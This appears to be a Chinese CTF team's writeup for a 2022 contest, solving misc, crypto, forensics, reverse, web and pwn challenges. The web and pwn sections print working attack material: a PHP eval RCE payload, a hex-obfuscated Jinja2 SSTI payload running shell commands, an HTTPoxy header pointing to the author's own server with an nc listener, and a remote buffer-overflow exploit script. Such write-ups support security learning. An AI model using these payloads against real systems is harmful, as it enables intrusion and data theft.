# 长安“战疫”网络安全卫士守护赛 1ynx战队 Writeup



<div class="has-toc have-toc">
</div>

## 0x00 前言

<div class="wp-block-image">
  <figure class="aligncenter"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-39.png" alt="" class="wp-image-4877" /></figure>
</div>
<div class="wp-block-image">
  <figure class="aligncenter size-full is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-40.png" alt="" class="wp-image-4879" width="792" height="293" /></figure>
</div>

## 0x01 八卦迷宫

`一起走迷宫吧，要提交全拼音字符奥`<figure class="wp-block-image size-full">

<img loading="lazy" width="2896" height="1856" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-35.png" alt="" class="wp-image-4867" /> </figure> 

走迷宫，将八卦转成字符为cazy{战长恙长战恙河长山山安战疫疫战疫安疫长安恙}，再进一步转成拼音`cazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}`

## 0x02 RCE\_No\_Para

<pre class="wp-block-code"><code> &lt;?php
if(';' === preg_replace('/&#91;^\W]+\((?R)?\)/', '', $_GET&#91;'code'])) { 
    if(!preg_match('/session|end|next|header|dir/i',$_GET&#91;'code'])){
        eval($_GET&#91;'code']);
    }else{
        die("Hacker!");
    }
}else{
    show_source(__FILE__);
}
?&gt; </code></pre>

我们可以通过传递的参数来进行RCE，`get_defined_vars()`，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。

`a=phpinfo();&code=eval(current(current(get_defined_var` `())));` <figure class="wp-block-image size-full">

<img loading="lazy" width="2266" height="1888" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-37.png" alt="" class="wp-image-4870" /> </figure> 

构造`a=system('cat flag.php');&code=eval(current(current(get_defined_vars())));`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-36.png" alt="" class="wp-image-4869" width="501" height="86" /> </figure> 

## 0x03 西安加油

用wireshark打开pcap文件，追踪tcp流，在`tcp.stream eq 6`时，发现出现secret.txt的字样和一大串疑似base64的字符。<figure class="wp-block-image size-full">

<img loading="lazy" width="1730" height="1113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-43.png" alt="" class="wp-image-4882" /> </figure> 

把字符提取出来，放到cyberchef里面，解密后疑似zip压缩包。<figure class="wp-block-image size-full">

<img loading="lazy" width="1444" height="658" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-41.png" alt="" class="wp-image-4880" /> </figure> 

解压后得到48张照片，拼好就可以得到flag。<figure class="wp-block-image size-full">

<img loading="lazy" width="1444" height="483" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-42.png" alt="" class="wp-image-4881" /> </figure> 

这个比较简单，直接开了个ppt手撕，得到cazy{make\_XiAN\_great_Again}。<figure class="wp-block-image size-full">

<img loading="lazy" width="555" height="349" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-44.png" alt="" class="wp-image-4883" /> </figure> 

## 0x04 no\_cry\_no_can

<pre class="wp-block-code"><code>from Crypto.Util.number import*
from secret import flag,key

assert len(key) &lt;= 5
assert flag&#91;:5] == b'cazy{'
def can_encrypt(flag,key):
    block_len = len(flag) // len(key) + 1
    new_key = key * block_len
    return bytes(&#91;i^j for i,j in zip(flag,new_key)])

c = can_encrypt(flag,key)
print(c)

# b'&lt;pH\x86\x1a&"m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l'</code></pre>

阅读代码可知，flag的前5个字符是cazy{，该算法会把key的长度进行填充，然后逐一与flag的字符进行异或，得到密文，而且key的长度是小于等于5的，所以我们可以通过密文前5个字符与flag前5个字符进行异或，求出key值，密文的长度是26，而flag的长度绝对不超过26，可以把key值进行填充，与密文逐一异或，即可求出flag。

脚本如下：

<pre class="wp-block-code"><code>flag_head = b'cazy{'
c_head = b'&lt;pH\x86\x1a'
key_max = (bytes(&#91;i^j for i,j in zip(flag_head,c_head)]))
print('key_max:',key_max)
c = b'&lt;pH\x86\x1a&"m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l'
block_len = len(c)// len(key_max) + 1
new_key = key_max * block_len
print('new_key:',new_key)
flag = (bytes(&#91;i^j for i,j in zip(c,new_key)]))
print('flag:',flag)</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1384" height="126" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-45.png" alt="" class="wp-image-4884" /> </figure> 

最终的flag为：`cazy{y3_1s_a_h4nds0me_b0y!}`

## 0x05 no\_can\_no_bb

<pre class="wp-block-code"><code>import random
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from secret import flag

assert flag&#91;:5] ==b'cazy{'

def pad(m):
    tmp = 16-(len(m)%16)
    return m + bytes(&#91;tmp for _ in range(tmp)])

def encrypt(m,key):
    aes = AES.new(key,AES.MODE_ECB)
    return aes.encrypt(m)

if __name__ == "__main__":
    flag = pad(flag)
    key = pad(long_to_bytes(random.randrange(1,1&lt;&lt;20)))
    c = encrypt(flag,key)
    print(c)
# b'\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c'</code></pre>

这道题的求解关键在于key值，它是从1到1048576中随机生成的一个数经过pad()函数处理得到的结果，可以发现这个范围并不是很大，可以直接暴力破解出来。

解密脚本如下：

<pre class="wp-block-code"><code>from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES

def pad(m):
    tmp = 16-(len(m)%16)
    return m + bytes(&#91;tmp for _ in range(tmp)])

def decrypt(m,key):
    aes = AES.new(key,AES.MODE_ECB)
    return aes.decrypt(m)

if __name__ == "__main__":
    c = b'\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c'
    for i in range(1,1&lt;&lt;20):
        key = pad(long_to_bytes(i))
        flag = decrypt(c,key)
        if b'cazy{' in flag:
            print(flag)</code></pre>

稍等几秒钟就能跑出结果。flag为`cazy{n0_c4n,bb?n0p3!}`<figure class="wp-block-image size-full">

<img loading="lazy" width="1377" height="70" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-46.png" alt="" class="wp-image-4885" /> </figure> 

## 0x06 朴实无华的取证

查看镜像信息<figure class="wp-block-image size-full">

<img loading="lazy" width="1379" height="422" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-47.png" alt="" class="wp-image-4886" /> </figure> 

filescan搜索一下txt文件，发现一个日记很可疑啊。<figure class="wp-block-image size-full">

<img loading="lazy" width="1385" height="100" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-48.png" alt="" class="wp-image-4887" /> </figure> 

导出查看，发现个很像密钥的玩意儿，`20211209`。<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-49.png" alt="" class="wp-image-4888" width="388" height="72" /> </figure> 

搜索图片，发现一个flag文件。<figure class="wp-block-image size-full">

<img loading="lazy" width="1387" height="577" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-50.png" alt="" class="wp-image-4889" /> </figure> 

导出查看一下，得到一串离谱的字母`FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-51.png" alt="" class="wp-image-4890" width="489" height="335" /> </figure> 

再搜索关键字桌面，找到flag.zip的压缩包。<figure class="wp-block-image size-full">

<img loading="lazy" width="1387" height="304" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-52.png" alt="" class="wp-image-4891" /> </figure> 

解压后查看发现和加密有关，foremost分离一下。<figure class="wp-block-image size-full">

<img loading="lazy" width="1384" height="177" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-53.png" alt="" class="wp-image-4892" /> </figure> 

得到一段加密代码

<pre class="wp-block-code"><code>//幼儿园水平的加密（部分）
void Encrypt(string& str)
{
        for(int i = 0; i &lt; str.length(); i++)
        {
                if(str&#91;i] &gt;='a'&& str&#91;i]&lt;='w')
                        str&#91;i]+=3;
                else if(str&#91;i]=='x')
                        str&#91;i]='a';
                else if(str&#91;i]=='y')
                        str&#91;i]='b';
                else if(str&#91;i]=='z')
                        str&#91;i]='c';        
                else if(str&#91;i]=='_')
                        str&#91;i]='|';
                str&#91;i] -= 32;
        }
}</code></pre>

用大班水平的代码能力编写如下脚本：

<pre class="wp-block-code"><code>s1 = 'FDCB&#91;8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]'

flag = ''
for i in range(len(s1)):
        k = chr(ord(s1&#91;i])+32)
        if chr(ord(k)-3) &gt;='a'and chr(ord(k)-3)&lt;='w':
                k = chr(ord(k)-3)
        elif(k == 'a'):
                k ='x';
        elif(k == 'b'):
                k = 'y';
        elif(k == 'c'):
                k = 'z';        
        elif(k == '|'):
                k = '_';
        flag += k
print (flag)</code></pre>

最后得到`cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-54.png" alt="" class="wp-image-4893" width="565" height="34" /> </figure> 

## 0x07 binary

使用jadx打开234文件，可以看到java代码。<figure class="wp-block-image size-full">

<img loading="lazy" width="1656" height="666" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-55.png" alt="" class="wp-image-4895" /> </figure> 

将byte数组转成ascii码，再转base64，得到一大串的01，感觉是二维码，上脚本。<figure class="wp-block-image size-full">

<img loading="lazy" width="1034" height="905" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-56.png" alt="" class="wp-image-4896" /> </figure> 

```python
from PIL import Image
from zlib import *

MAX = 37
pic = Image.new("RGB",(MAX,MAX))
str ="0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000"

i=0
for y in range(0,MAX):
    for x in range(0,MAX):
        if(str[i] == '1'):
            pic.putpixel([x,y],(0,0,0))
        else:pic.putpixel([x,y],(255,255,255))
        i = i+1
pic.save("flag.png")
```

最后得到图片，扫描得到`flag{932b2c0070e4897ea7df0190dbf36ece}`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-57.png" alt="" class="wp-image-4897" width="143" height="142" /> </figure> 

## 0x08 Flask

给了hint<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-58.png" alt="" class="wp-image-4898" width="550" height="185" /> </figure> 

利用.js?作为后缀绕过重定向，进入admin路由<figure class="wp-block-image size-full">

<img loading="lazy" width="1411" height="492" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-59.png" alt="" class="wp-image-4899" /> </figure> 


根据提示admin/?name=找到ssti入口

测试了下存在过滤了__,subclasses,[,],builtins,args等

中括号通过attr的过滤器绕过，字符串以及下划线过滤用16进制绕过，

最终payload

<pre class="wp-block-code"><code>/admin?name={{lipsum"attr('\x5f\x5fglobals\x5f\x5f')"attr('get')
('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f')"attr('get')('eval')
('\x5f\x5fimport\x5f\x5f("os").popen("cat%20flag").read()')}}.js?</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="1352" height="435" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-60.png" alt="" class="wp-image-4900" /> </figure> 

## 0x09 Flag配送中心

考点HTTPoxy漏洞(CVE-2016-5385)

报文中加个proxy:http://vps:2333<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-61.png" alt="" class="wp-image-4901" width="583" height="351" /> </figure> 

在自己vps上监听该端口

nc-lvp2333

发个请求

接收到flag<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-62.png" alt="" class="wp-image-4902" width="595" height="271" /> </figure> 

## 0x0A pwn1

<figure class="wp-block-image size-full">

<img loading="lazy" width="1385" height="280" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-64.png" alt="" class="wp-image-4904" /></figure> 

<pre class="wp-block-code"><code>from pwn import *
# sh = process('pwn1')
sh = remote("113.201.14.253",16088)
vul_addr = 0x08048540
gift = sh.recv()&#91;5:15]
gift = int(gift,16)
print(hex(gift))
payload = b'a'*(52)+p32(gift+0x50)+b"a"*20+p32(vul_addr)
# input()
sh.send(payload)
sh.interactive()</code></pre><figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-65.png" alt="" class="wp-image-4905" width="705" height="593" /> </figure> 

## 0x0B combat_slogan

将密文作为参数传进加密函数即可<figure class="wp-block-image size-full">

<img loading="lazy" width="1383" height="933" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-66.png" alt="" class="wp-image-4906" /> </figure> 

## 0x0C cute_doge

<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-67.png" alt="" class="wp-image-4907" width="344" height="488" /> </figure> 

信了信了

x64dbg打开QMessageBox下断点，跟几步就看到了flag<figure class="wp-block-image size-full">

<img loading="lazy" width="1390" height="677" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2022/01/图片-68.png" alt="" class="wp-image-4908" /> </figure> 

## 0x0D hello_py

<pre class="wp-block-code"><code>Happy = &#91;44,100,3,50,106,90,5,102,10,112]

for i in range(10):
    if(i%2==1):
        print(chr(Happy&#91;i]^i),end='')
    else:
        print(chr(Happy&#91;i]^Happy&#91;i+1]),end='')</code></pre>
